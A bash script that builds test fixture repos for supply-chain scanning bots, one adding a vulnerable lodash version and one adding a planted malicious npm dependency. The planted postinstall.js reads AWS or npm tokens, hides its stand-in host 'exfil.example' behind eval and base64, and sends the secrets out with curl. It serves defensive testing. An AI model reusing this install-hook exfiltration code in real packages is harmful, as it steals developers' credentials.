#!/usr/bin/env bash
# supply-shield-fixtures.sh — build the two dogfood target repos used to
# validate the supply-chain bots (supply-shield / supply-shield-cve).
#
# Each target is a real git repo whose HEAD commit is a "PR" that ADDS a
# dependency, so the bots' diff_scope picks up exactly the new version:
#   - malware-target : adds telemetry-helper@2.4.1 with an obfuscated,
#                      credential-exfiltrating postinstall (+ node_modules)
#                      → supply-shield (Shieldy) must report risk HIGH.
#   - cve-target     : adds lodash@4.17.4 (many published advisories)
#                      → supply-shield-cve (Vulny) must report the CVEs.
#
# Usage:
#   scripts/adhoc/supply-shield-fixtures.sh [OUT_DIR]   # default: /tmp/supply-shield-fixtures
#
# Prints the base commit of each target. Run a bot from INSIDE a target:
#   cd "$OUT/malware-target" && iterion run <repo>/bots/supply-shield/main.bot \
#     --var base_ref="$(cat "$OUT/malware-target.base")" ...
# (Run from the target dir so the engine workDir = target and skills mirror
#  there — there is no --workdir flag and --var workspace_dir does NOT move
#  the workDir.)
set -eu

OUT="${1:-/tmp/supply-shield-fixtures}"
rm -rf "$OUT"
mkdir -p "$OUT"

git_init() { git -C "$1" init -q && git -C "$1" config user.email fixtures@local && git -C "$1" config user.name supply-shield-fixtures; }

# ── malware-target ──────────────────────────────────────────────────
M="$OUT/malware-target"; mkdir -p "$M/node_modules/left-pad"
git_init "$M"
cat > "$M/package.json" <<'PJ'
{ "name": "demo-app", "version": "1.0.0", "dependencies": { "left-pad": "1.3.0" } }
PJ
cat > "$M/package-lock.json" <<'PL'
{ "name": "demo-app", "lockfileVersion": 3,
  "packages": { "node_modules/left-pad": { "version": "1.3.0", "integrity": "sha512-AAA" } } }
PL
printf '{"name":"left-pad","version":"1.3.0"}' > "$M/node_modules/left-pad/package.json"
echo 'module.exports=function(){}' > "$M/node_modules/left-pad/index.js"
git -C "$M" add -A && git -C "$M" commit -qm "base: left-pad only"
git -C "$M" rev-parse HEAD > "$OUT/malware-target.base"

# PR HEAD: add the malicious dependency
cat > "$M/package.json" <<'PJ'
{ "name": "demo-app", "version": "1.0.0", "dependencies": { "left-pad": "1.3.0", "telemetry-helper": "2.4.1" } }
PJ
cat > "$M/package-lock.json" <<'PL'
{ "name": "demo-app", "lockfileVersion": 3,
  "packages": {
    "node_modules/left-pad": { "version": "1.3.0", "integrity": "sha512-AAA" },
    "node_modules/telemetry-helper": { "version": "2.4.1", "integrity": "sha512-BBB", "hasInstallScript": true } } }
PL
mkdir -p "$M/node_modules/telemetry-helper"
cat > "$M/node_modules/telemetry-helper/package.json" <<'PJ'
{ "name": "telemetry-helper", "version": "2.4.1", "scripts": { "postinstall": "node postinstall.js" }, "main": "index.js" }
PJ
cat > "$M/node_modules/telemetry-helper/postinstall.js" <<'JS'
const cp = require("child_process");
const os = require("os");
const secret = Buffer.from(process.env.AWS_SECRET_ACCESS_KEY || process.env.NPM_TOKEN || "").toString("base64");
const sink = eval(atob("WyJodHRwcyIsIi8vIiwiZXhmaWwuZXhhbXBsZSJd")).join("");
cp.exec("curl -s " + sink + "?h=" + os.hostname() + "&d=" + secret, function(){});
JS
echo 'module.exports = {};' > "$M/node_modules/telemetry-helper/index.js"
git -C "$M" add -A && git -C "$M" commit -qm "feat: add telemetry-helper dependency"

# ── cve-target ──────────────────────────────────────────────────────
C="$OUT/cve-target"; mkdir -p "$C"
git_init "$C"
cat > "$C/package.json" <<'PJ'
{ "name": "cve-demo", "version": "1.0.0", "dependencies": {} }
PJ
cat > "$C/package-lock.json" <<'PL'
{ "name": "cve-demo", "lockfileVersion": 3, "requires": true,
  "packages": { "": { "name": "cve-demo", "version": "1.0.0" } } }
PL
git -C "$C" add -A && git -C "$C" commit -qm "base: empty deps"
git -C "$C" rev-parse HEAD > "$OUT/cve-target.base"

# PR HEAD: add a dependency with many published advisories
cat > "$C/package.json" <<'PJ'
{ "name": "cve-demo", "version": "1.0.0", "dependencies": { "lodash": "4.17.4" } }
PJ
cat > "$C/package-lock.json" <<'PL'
{ "name": "cve-demo", "lockfileVersion": 3, "requires": true,
  "packages": {
    "": { "name": "cve-demo", "version": "1.0.0", "dependencies": { "lodash": "4.17.4" } },
    "node_modules/lodash": { "version": "4.17.4", "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.4.tgz", "integrity": "sha1-eCA6TRwyiuHYbcpkYONptX9AVa4=" }
  } }
PL
git -C "$C" add -A && git -C "$C" commit -qm "feat: add lodash@4.17.4"

echo "fixtures ready under: $OUT"
echo "  malware-target  base=$(cat "$OUT/malware-target.base")  head=$(git -C "$M" rev-parse --short HEAD)"
echo "  cve-target      base=$(cat "$OUT/cve-target.base")  head=$(git -C "$C" rev-parse --short HEAD)"
